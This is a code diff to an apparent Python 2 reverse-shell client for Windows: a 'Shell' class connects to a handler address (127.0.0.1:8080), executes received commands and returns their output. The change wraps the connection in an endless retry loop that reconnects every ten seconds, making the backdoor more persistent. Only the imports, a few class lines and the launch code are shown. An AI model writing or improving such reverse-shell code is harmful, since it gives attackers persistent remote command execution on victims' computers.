@@ -1,4 +1,4 @@
-import socket, subprocess, os, threading, json, base64, win32api, datetime, getpass
+import socket, subprocess, os, threading, json, base64, win32api, datetime, getpass, time
 
 class Shell:
 	def __init__(self, handler_ip, handler_port):
@@ -96,6 +96,12 @@ class Shell:
 			output = self.handle_command(data)
 			self.send_data(output)
 			
-shell = Shell("127.0.0.1", 8080)
-shell.connect()
-shell.run()
+while True:
+	try:
+		shell = Shell("127.0.0.1", 8080)
+		shell.connect()
+		shell.run()
+	except Exception as e:
+		print e
+		time.sleep(10)
+		continue
